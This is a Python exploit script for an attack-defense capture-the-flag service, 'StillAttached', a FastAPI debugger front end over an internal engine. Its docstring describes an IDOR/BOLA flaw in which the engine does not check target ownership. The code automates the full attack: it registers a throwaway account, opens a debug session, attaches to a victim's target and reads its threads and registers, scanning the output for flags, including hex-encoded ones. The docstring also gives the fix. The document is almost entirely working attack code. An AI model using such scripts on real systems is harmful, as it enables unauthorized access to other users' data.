"""Exploit for StillAttached — FastAPI "debugger" web (:18080) over an internal
pwn engine (engine:31337, not reachable from other teams).

flag_id = {"target": <int>, "tid": <int>}: the flag lives on the engine "target"
with that id, on thread `tid`. The web layer only *filters* GET /api/targets down
to the caller's own targets (main.py: `[t for t in targets if t.get("mine")]`), but
the per-session commands (attach/threads/threads_next/read_reg) are forwarded to the
engine with our owner id and — on unpatched boxes — the engine does NOT verify the
attached target belongs to us (BOLA/IDOR; cf. web/main.py.bak_idor*). So we:

    register -> login -> POST /api/sessions (open a debug session)
    -> attach(id = victim target) -> read it back (threads / threads_next / read_reg)

We don't have the engine binary, so we read broadly: after attaching we call every
read command and scan each response for the flag, both as plain text and hex-decoded
(the `note` channel stores data as hex, so a planted flag may come back hex-encoded).

Patch (defense): verify target ownership in the engine on attach (and on every
command carrying a session) — not only by filtering the targets list in the web.

Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = {"target":int,"tid":int}
Deps: requests.
"""
import binascii
import json
import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
HEX_RE = re.compile(r"(?:[0-9a-fA-F]{2}){30,}")   # >=30 bytes of hex (a 32-char flag is 64)
TIMEOUT = 6
REGS = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rsp", "rip"]

# One logged-in session per box (cheap reuse across rounds); re-login if it expires.
_SESS = {}


def _rand(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _scan(text, out, seen):
    if not text:
        return
    s = text if isinstance(text, str) else str(text)
    for m in FLAG_RE.findall(s):
        if m not in seen:
            seen.add(m)
            out.append(m)
    for h in HEX_RE.findall(s):                    # notes are stored hex -> try decoding
        try:
            dec = binascii.unhexlify(h).decode("latin-1")
        except (binascii.Error, ValueError):
            continue
        for m in FLAG_RE.findall(dec):
            if m not in seen:
                seen.add(m)
                out.append(m)


def _login(base):
    s = requests.Session()
    u, p = "u" + _rand(10), _rand(16)
    try:
        s.post(base + "/api/auth/register", json={"username": u, "password": p}, timeout=TIMEOUT)
        r = s.post(base + "/api/auth/login", json={"username": u, "password": p}, timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        tok = r.json().get("access_token")
    except (ValueError, requests.RequestException):
        return None
    if tok:
        s.headers["Authorization"] = "Bearer " + tok       # cookie is set too; belt + braces
    return s


def _session(base):
    s = _SESS.get(base)
    if s is not None:
        try:
            if s.get(base + "/api/auth/me", timeout=TIMEOUT).status_code == 200:
                return s
        except requests.RequestException:
            pass
    s = _login(base)
    if s is not None:
        _SESS[base] = s
    else:
        _SESS.pop(base, None)
    return s


def _parse_flag_id(flag_id):
    if flag_id is None:
        return None, 0
    raw = flag_id
    if isinstance(raw, str):
        raw = raw.strip()
        if raw.startswith("{"):
            try:
                raw = json.loads(raw)
            except ValueError:
                return None, 0
    if not isinstance(raw, dict):
        return None, 0
    target, tid = raw.get("target"), raw.get("tid", 0)
    try:
        return int(target), int(tid if tid is not None else 0)
    except (TypeError, ValueError):
        return None, 0


def _cmd(s, base, sess, out, seen, **body):
    try:
        r = s.post(base + "/api/sessions/%s/command" % sess, json=body, timeout=TIMEOUT)
        _scan(r.text, out, seen)
        return r
    except requests.RequestException:
        return None


def exploit(host, port, flag_id):
    flags, seen = [], set()
    try:
        target, tid = _parse_flag_id(flag_id)
        if target is None:
            return flags
        base = "http://%s:%s" % (host, port)       # %s: a non-int port returns [] instead of raising
        s = _session(base)
        if s is None:
            return flags

        try:
            r = s.post(base + "/api/sessions", timeout=TIMEOUT)
        except requests.RequestException:
            return flags
        sess = None
        m = re.search(r"[0-9a-f]{48}", r.text or "")
        if m:
            sess = m.group(0)
        else:
            _scan(r.text, flags, seen)              # in case something leaks even here
            return flags

        # attach to the victim's target, then read it back every way we can
        _cmd(s, base, sess, flags, seen, command="attach", id=target)
        _cmd(s, base, sess, flags, seen, command="threads")
        for _ in range(16):                         # walk the thread pages
            r = _cmd(s, base, sess, flags, seen, command="threads_next")
            if r is None or r.status_code != 200 or flags:
                break
        if not flags:
            for reg in REGS:
                _cmd(s, base, sess, flags, seen, command="read_reg", tid=tid, reg=reg)

        try:
            s.delete(base + "/api/sessions/%s" % sess, timeout=TIMEOUT)   # tidy up
        except requests.RequestException:
            pass
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 18080
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
